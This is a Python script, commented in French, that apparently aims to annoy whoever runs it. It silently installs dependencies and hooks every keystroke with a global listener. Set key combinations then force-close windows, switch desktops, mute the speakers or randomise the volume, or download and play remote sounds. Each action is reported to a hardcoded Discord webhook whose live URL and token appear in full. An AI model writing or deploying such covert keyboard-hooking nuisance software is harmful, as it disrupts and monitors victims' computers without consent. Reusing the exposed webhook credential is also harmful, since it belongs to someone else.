from random import randint
import math
from time import sleep
import os.path
import os
import pip
import secrets

webhook_link = "https://discord.com/api/webhooks/1184525775400095744/-rQXhzo5YQDm8-K4GQVXbz32C9NMj0ykOOxvmJz1bTXjeuMI0_bsHF15UJGSDMAuOgeO"

# Faire un programme a partir des fonctions qui fait rager les gens

# POPUP -> powershell (New-Object -ComObject Wscript.Shell).Popup("""Operation Completed""",0,"""Done""",0x0)
# ETEINDRE ????

# Séparer onlineside en lib et executions

# regarder si on peut mettre plusieurs touches dans keylist dans add_key_press_event

# mettre des trucks louche dans le clipboard

# Faire que log ne bloque pas la suite du programme

def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

try:
    import requests
except:
    install("requests")
    import requests

username = secrets.token_urlsafe(10)

def log(msg):
    content = ""
    try:
        with open("logs.txt","r") as f:
            content = f.read()
    except:
        pass
    if content != "":
        content += "\n"
    with open("logs.txt","w") as f:
        f.write(content + msg)
    print(msg)
    data = {"content" : f"``{msg}``","username" : username}
    r = requests.post(webhook_link,json=data)

log("Loading requierements")

try:
    from pynput.keyboard import Key, Controller, Listener
except:
    try:
        install("pynput")
        from pynput.keyboard import Key, Controller, Listener
    except:
        log("Can't load 'pynput' module")

try:
    from ctypes import cast, POINTER
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except:
    try:
        install("pycaw")
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        import math
    except:
        log("Can't load 'pycaw' module")

try:
    os.add_dll_directory(r"C:\Program Files\VideoLAN\VLC")
except:
    pass
try:
    os.add_dll_directory(r"C:\Program Files (x86)\VideoLAN\VLC")
except:
    pass

try:
    from vlc import MediaPlayer as playsoundfromdisk
except:
    try:
        install("python-vlc")
        from vlc import MediaPlayer as playsoundfromdisk
    except:
        log("Can't load 'python-vlc' module")

try:
    from webbrowser import open as webopen
except:
    try:
        install("webbrowser")
        from webbrowser import open as webopen
    except:
        log("Can't load 'webbrowser' module")

last_keys = []
keypress_event = []

def startswithlist(list1,list2):
    return list1[:len(list2)] == list2

actions = []

def on_press(key):
    try:
        if type(key) != type(Key.alt):
            key = str(key).replace("'","")
        last_keys.insert(0,key)
        for x in keypress_event :
            if startswithlist(last_keys,x[0]):        
                actions.append(x[1])

    except Exception as E:
        log(f"Error {E} on_press({key})")

def add_key_press_event(keys: dict, func: str):
    try:
        keypress_event.append([keys,func])
        log(f"Sucessfuly add_key_press_event({keys},{func})")
    except Exception as E:
        log(f"Error {E} while trying to add_key_press_event({keys},{func})")

listener = Listener(on_press=on_press)
listener.start()

def unmute():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(0, None)
        log("Sucessfuly unmute")
    except Exception as E:
        log(f"Error {E} while trying to unmute")

def mute():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(1, None)
        log("Sucessfuly mute")
    except Exception as E:
        log(f"Error {E} while trying to mute")

def set_random_volume():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        # Get current volume 
        currentVolumeDb = volume.GetMasterVolumeLevel()
        randint(0,1)
        volume.SetMasterVolumeLevel(randint(-30,0), None)
        log("Sucessfuly set_random_volume")
    except Exception as E:
        log(f"Error {E} while trying to set_random_volume")

def alt_f4():
    try:
        keyboard = Controller()
        keyboard.press(Key.alt)
        keyboard.press(Key.f4)
        keyboard.release(Key.alt)
        keyboard.release(Key.f4)
        log("Sucessfuly alt_f4")
    except Exception as E:
        log(f"Error {E} while trying to alt_f4")

def win_d():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press("d")
        keyboard.release(Key.cmd)
        keyboard.release("d")
        log("Sucessfuly win_d")
    except Exception as E:
        log(f"Error {E} while trying to win_d")

def ctrl_win_d():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press(Key.ctrl)
        keyboard.press("d")
        keyboard.release(Key.cmd)
        keyboard.release(Key.ctrl)
        keyboard.release("d")
        log("Sucessfuly ctrl_win_d")
    except Exception as E:
        log(f"Error {E} while trying to ctrl_win_d")

def ctrl_win_right():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press(Key.ctrl)
        keyboard.press(Key.right)
        keyboard.release(Key.cmd)
        keyboard.release(Key.ctrl)
        keyboard.release(Key.right)
        log("Sucessfuly ctrl_win_right")
    except Exception as E:
        log(f"Error {E} while trying to ctrl_win_right")

def ctrl_win_left():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press(Key.ctrl)
        keyboard.press(Key.left)
        keyboard.release(Key.cmd)
        keyboard.release(Key.ctrl)
        keyboard.release(Key.left)
        log("Sucessfuly ctrl_win_left")
    except Exception as E:
        log(f"Error {E} while trying to ctrl_win_left")

def download_file(url):
    local_filename = url.split('/')[-1]
    # NOTE the stream=True parameter below
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                #if chunk: 
                f.write(chunk)
    return local_filename

def playsound(url):
    try:
        name = url.split('/')[-1]
        check_file = os.path.isfile(name)
        if check_file == False:
            download_file(url)
        playsoundfromdisk(name).play()
        log(f"Sucessfuly playsound({url})")
    except Exception as E:
        log(f"Error {E} while trying to playsound({url})")


log("Import finished")

# Feature list:
# playsound(url)
# ctrl_win_left()
# ctrl_win_right()
# ctrl_win_d()
# win_d()
# alt_f4()
# set_random_volume()
# mute()
# unmute()
# webopen(url)
# add_key_press_event([key list],[nom de la fonction,argument optionelle])


# add_key_press_event([Key.caps_lock],[alt_f4])
# add_key_press_event([Key.esc],[playsound,"https://raw.githubusercontent.com/tonioliii/jkiller/main/fortnite.mp3"])
# add_key_press_event(['\\x03'],[mute])

while True:
    if actions != []:
        action = actions[0]
        if len(action) == 2:
            action[0](action[1])
        else:
            action[0]()
        actions = actions[1:]